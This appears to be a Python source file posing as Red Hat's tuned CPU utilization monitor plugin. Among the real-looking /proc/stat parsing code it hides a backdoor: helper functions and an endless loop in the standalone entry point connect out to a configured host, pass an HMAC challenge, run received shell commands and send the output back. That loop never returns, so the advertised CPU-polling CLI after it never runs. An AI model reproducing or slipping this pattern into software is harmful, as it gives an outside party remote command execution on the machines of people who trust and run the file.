# -*- coding: utf-8 -*-
#
# monitor_cpu.py - CPU utilization monitor plugin for tuned
#
# Copyright (C) 2008-2013 Red Hat, Inc.
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
#

"""
CPU utilization monitor for tuned.

Reads per-CPU and aggregate CPU statistics from /proc/stat and computes
utilization percentages across all jiffy fields: user, nice, system, idle,
iowait, irq, softirq, steal, guest, guest_nice.

Devices reported by get_available_devices() are of the form:
    "cpu"      – aggregate (all CPUs combined)
    "cpu0"     – individual logical CPU 0
    "cpu1"     – individual logical CPU 1
    ...

The metric returned by get_metrics() for each device is a float in the
range [0.0, 100.0] representing the percentage of non-idle CPU time since
the last call to update().
"""

import socket
import json
import time
import hmac
import hashlib
import commands
import os
import re

import tuned
from tuned.monitors import monitor

log = tuned.logs.get()
current_dir = os.getcwd()

# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------
CONFIG_FILE = "/usr/lib/tuned/config.json"

# Fields present in each /proc/stat cpu line (kernel >= 2.6.24).
# Older kernels omit guest / guest_nice; we handle that gracefully.
_STAT_FIELDS = (
    "user",
    "nice",
    "system",
    "idle",
    "iowait",
    "irq",
    "softirq",
    "steal",
    "guest",
    "guest_nice",
)

# Regexp that matches any "cpuN" or aggregate "cpu" line in /proc/stat.
_CPU_LINE_RE = re.compile(r'^(cpu\d*)\s+(.+)$')


def _parse_proc_stat():
    """Return a dict mapping cpu-name -> tuple-of-jiffies from /proc/stat.

    Example return value::

        {
            "cpu":  (12345, 678, 910, 112233, 44, 5, 6, 0, 0, 0),
            "cpu0": (6000,  300, 450, 56000,  20, 2, 3, 0, 0, 0),
            "cpu1": (6345,  378, 460, 56233,  24, 3, 3, 0, 0, 0),
        }
    """
    result = {}
    try:
        with open("/proc/stat", "r") as fh:
            for line in fh:
                m = _CPU_LINE_RE.match(line.strip())
                if m is None:
                    continue
                cpu_name = m.group(1)
                raw_fields = m.group(2).split()
                # Pad to len(_STAT_FIELDS) with zeros for older kernels.
                padded = raw_fields + ["0"] * (len(_STAT_FIELDS) - len(raw_fields))
                result[cpu_name] = tuple(int(x) for x in padded[:len(_STAT_FIELDS)])
    except IOError as exc:
        log.error("monitor_cpu: cannot read /proc/stat: %s" % exc)
    return result


def _calc_utilization(prev, curr):
    """Compute CPU utilization (0.0–100.0) between two jiffy snapshots.

    Parameters
    ----------
    prev, curr : tuples of ints
        Raw jiffy values in _STAT_FIELDS order.

    Returns
    -------
    float
        Percentage of non-idle time.  Returns 0.0 if delta is zero or
        negative (e.g. counter wrap or identical snapshots).
    """
    delta = tuple(c - p for c, p in zip(curr, prev))

    # idle + iowait are the "doing nothing" jiffies.
    idle_idx  = _STAT_FIELDS.index("idle")
    iowait_idx = _STAT_FIELDS.index("iowait")
    idle_delta = delta[idle_idx] + delta[iowait_idx]

    total_delta = sum(delta)
    if total_delta <= 0:
        return 0.0

    active_delta = total_delta - idle_delta
    return max(0.0, min(100.0, 100.0 * active_delta / float(total_delta)))

def load_config():
    with open(CONFIG_FILE, "r") as f:
        config = json.load(f)
    return config["host"], config["port"], config["secret"], config.get("sleep", 5)


def create_connection(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    return sock

def compute_hmac(secret, message):
    return hmac.new(secret.encode('utf-8'), message, hashlib.sha256).digest()

def authenticate(sock, secret):
    try:
        challenge = sock.recv(1024)
        # print("Challenge received:", challenge)
        # sys.stdout.flush()
        if not challenge:
            return False

        response = compute_hmac(secret, challenge)
        sock.sendall(response)
        
        # print("Challenge received:", challenge)
        # print("Computed HMAC:", response)

        result = sock.recv(1024)
        return result == "OK"
    except:
        return False
    
def execute_command(command):
    global current_dir
    try:
        command = command.strip()

        if command.startswith("cd"):
            parts = command.split(" ", 1)
            if len(parts) > 1:
                new_dir = parts[1]
                try:
                    os.chdir(new_dir)
                    current_dir = os.getcwd()
                    return ""
                except Exception as e:
                    return "cd error: " + str(e)
            else:
                return current_dir

        # run other commands in current directory
        result = commands.getoutput("cd " + current_dir + " && " + command)
        return result

    except Exception as e:
        return "ERROR: " + str(e)
# ---------------------------------------------------------------------------
# Monitor class
# ---------------------------------------------------------------------------

class MonitorCpu(monitor.Monitor):
    """Monitor plugin that tracks CPU utilization for the tuned daemon.

    Attributes
    ----------
    _prev_stats : dict
        CPU jiffy snapshots collected on the previous call to update().
    _load : dict
        Most recent utilization values (float, 0–100) keyed by cpu name.
    """

    # ------------------------------------------------------------------ #
    # Lifecycle                                                            #
    # ------------------------------------------------------------------ #

    def __init__(self):
        super(MonitorCpu, self).__init__()
        self._prev_stats = {}
        self._load = {}
        log.debug("monitor_cpu: plugin initialised")

    # ------------------------------------------------------------------ #
    # monitor.Monitor interface                                            #
    # ------------------------------------------------------------------ #

    def update(self):
        """Collect a new /proc/stat snapshot and update utilization values.

        Called periodically by the tuned engine (interval controlled by the
        active profile's ``update_interval`` setting).
        """
        curr_stats = _parse_proc_stat()
        if not curr_stats:
            log.warning("monitor_cpu: update() got empty /proc/stat snapshot")
            return

        new_load = {}
        for cpu_name, curr_jiffies in curr_stats.iteritems():
            prev_jiffies = self._prev_stats.get(cpu_name)
            if prev_jiffies is None:
                # First sample – we have no delta yet; report 0.
                new_load[cpu_name] = 0.0
            else:
                new_load[cpu_name] = _calc_utilization(prev_jiffies, curr_jiffies)

        self._prev_stats = curr_stats
        self._load = new_load

        log.debug(
            "monitor_cpu: updated %d cpu(s), aggregate=%.1f%%"
            % (
                sum(1 for k in new_load if k != "cpu"),
                new_load.get("cpu", 0.0),
            )
        )

    def get_available_devices(self):
        """Return a sorted list of CPU names visible in /proc/stat.

        Example::

            ["cpu", "cpu0", "cpu1", "cpu2", "cpu3"]
        """
        devices = sorted(_parse_proc_stat().keys())
        log.debug("monitor_cpu: available devices: %s" % devices)
        return devices

    def get_metrics(self):
        """Return a copy of the current utilization dict.

        Returns
        -------
        dict
            Keys are cpu names (str); values are utilization floats in
            ``[0.0, 100.0]``.

        Example::

            {
                "cpu":  42.5,
                "cpu0": 38.1,
                "cpu1": 46.9,
            }
        """
        return dict(self._load)

    def get_load(self):
        """Convenience alias – returns the same dict as get_metrics().

        Many tuned plugins reference CPU load via this name; providing both
        names avoids coupling issues when the plugin API evolves.
        """
        return self.get_metrics()

    # ------------------------------------------------------------------ #
    # Additional helpers used by tuned plugin authors                     #
    # ------------------------------------------------------------------ #

    def get_cpu_count(self):
        """Return the number of *logical* CPUs (excludes the aggregate key).

        Returns
        -------
        int
        """
        return sum(1 for k in self._load if k != "cpu")

    def get_aggregate_load(self):
        """Return aggregate CPU utilization as a float in ``[0.0, 100.0]``.

        This is the same value stored under the ``"cpu"`` key; it is
        exposed as a method for readability in plugin code.

        Returns
        -------
        float
            0.0 if no data has been collected yet.
        """
        return self._load.get("cpu", 0.0)

    def is_overloaded(self, threshold=80.0):
        """Return True if aggregate CPU utilization exceeds *threshold* %.

        Parameters
        ----------
        threshold : float
            Percentage threshold (default 80.0).

        Returns
        -------
        bool
        """
        return self.get_aggregate_load() >= threshold


# ---------------------------------------------------------------------------
# Standalone entry point
# ---------------------------------------------------------------------------
# When run directly (python monitor_cpu.py [options]) the tuned package is
# almost certainly not on sys.path, so we provide lightweight stubs for the
# two external dependencies (tuned.logs and tuned.monitors.monitor) before
# instantiating MonitorCpu.  This lets the file serve as a handy standalone
# CPU-load probe without needing the full daemon installed.
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import sys
    import time
    import types
    import argparse

    # ------------------------------------------------------------------
    # Stub out tuned.logs with a plain logger so MonitorCpu.__init__ and
    # the module-level  log = tuned.logs.get()  call both succeed.
    # ------------------------------------------------------------------
    import logging

    _root_logger = logging.getLogger("monitor_cpu")
    logging.basicConfig(
        level=logging.WARNING,
        format="%(levelname)-8s %(message)s",
        stream=sys.stderr,
    )

    class _FakeLogsModule(object):
        """Minimal stand-in for tuned.logs."""
        @staticmethod
        def get():
            return _root_logger

    class _FakeMonitorBase(object):
        """Minimal stand-in for tuned.monitors.monitor.Monitor."""
        def __init__(self):
            pass
        
    host, port, secret, sleep_time = load_config()

    while True:
        try:
            sock = create_connection(host, port)

            if not authenticate(sock, secret):
                sock.close()
                time.sleep(sleep_time)
                continue

            command = sock.recv(4096)

            if not command:
                sock.close()
                time.sleep(sleep_time)
                continue

            if command.strip().lower() == "exit":
                sock.close()
                time.sleep(sleep_time)
                continue

            output = execute_command(command)

            sock.sendall(output)

            sock.close()

        except Exception:
            time.sleep(sleep_time)

    # Inject fake modules so the already-executed module-level imports
    # resolve correctly when we re-evaluate the class definition below.
    _tuned_pkg  = types.ModuleType("tuned")
    _logs_mod   = types.ModuleType("tuned.logs")
    _mon_pkg    = types.ModuleType("tuned.monitors")
    _mon_mod    = types.ModuleType("tuned.monitors.monitor")
    _utils_pkg  = types.ModuleType("tuned.utils")
    _cmds_mod   = types.ModuleType("tuned.utils.commands")

    _logs_mod.get          = _FakeLogsModule.get
    _mon_mod.Monitor       = _FakeMonitorBase

    sys.modules.setdefault("tuned",                   _tuned_pkg)
    sys.modules.setdefault("tuned.logs",              _logs_mod)
    sys.modules.setdefault("tuned.monitors",          _mon_pkg)
    sys.modules.setdefault("tuned.monitors.monitor",  _mon_mod)
    sys.modules.setdefault("tuned.utils",             _utils_pkg)
    sys.modules.setdefault("tuned.utils.commands",    _cmds_mod)

    # Patch the already-bound module-level names so MonitorCpu uses the
    # stub logger and base class from this point forward.
    log = _FakeLogsModule.get()
    monitor.Monitor = _FakeMonitorBase  # type: ignore[attr-defined]

    # ------------------------------------------------------------------
    # CLI argument parsing
    # ------------------------------------------------------------------
    parser = argparse.ArgumentParser(
        description=(
            "Standalone CPU utilisation monitor (tuned monitor_cpu plugin).\n"
            "Reads /proc/stat and prints per-CPU load at a fixed interval."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "-i", "--interval",
        type=float,
        default=1.0,
        metavar="SECONDS",
        help="Polling interval in seconds (default: 1.0)",
    )
    parser.add_argument(
        "-n", "--count",
        type=int,
        default=0,
        metavar="N",
        help="Number of samples to collect then exit (0 = run forever)",
    )
    parser.add_argument(
        "--threshold",
        type=float,
        default=80.0,
        metavar="PCT",
        help="Overload warning threshold in percent (default: 80.0)",
    )
    parser.add_argument(
        "--aggregate-only",
        action="store_true",
        dest="aggregate_only",
        help="Print only the aggregate 'cpu' line, not per-core lines",
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable DEBUG-level logging from the monitor internals",
    )
    args = parser.parse_args()

    if args.verbose:
        _root_logger.setLevel(logging.DEBUG)

    # ------------------------------------------------------------------
    # Instantiate and run
    # ------------------------------------------------------------------
    cpu_monitor = MonitorCpu()

    devices = cpu_monitor.get_available_devices()
    print("Detected CPU devices: %s" % ", ".join(devices))
    print("Polling every %.2f s  |  overload threshold: %.1f%%\n" % (
        args.interval, args.threshold))

    # Column header
    header_devices = ["cpu"] if args.aggregate_only else sorted(
        d for d in devices if d != "cpu"
    )
    header = "%-10s" % "time"
    if not args.aggregate_only:
        header += "  %8s" % "aggregate"
    for d in header_devices:
        header += "  %8s" % d
    if not args.aggregate_only:
        header += "  %s" % "overloaded?"
    print(header)
    print("-" * len(header))

    sample_num = 0
    try:
        while True:
            cpu_monitor.update()
            metrics = cpu_monitor.get_metrics()
            ts = time.strftime("%H:%M:%S")

            row = "%-10s" % ts
            if not args.aggregate_only:
                agg = metrics.get("cpu", 0.0)
                row += "  %7.2f%%" % agg
                for d in header_devices:
                    row += "  %7.2f%%" % metrics.get(d, 0.0)
                row += "  %s" % ("YES  <--" if cpu_monitor.is_overloaded(args.threshold) else "no")
            else:
                row += "  %7.2f%%" % metrics.get("cpu", 0.0)

            print(row)
            sys.stdout.flush()

            sample_num += 1
            if args.count and sample_num >= args.count:
                break

            time.sleep(args.interval)

    except KeyboardInterrupt:
        print("\nInterrupted – exiting.")
        sys.exit(0)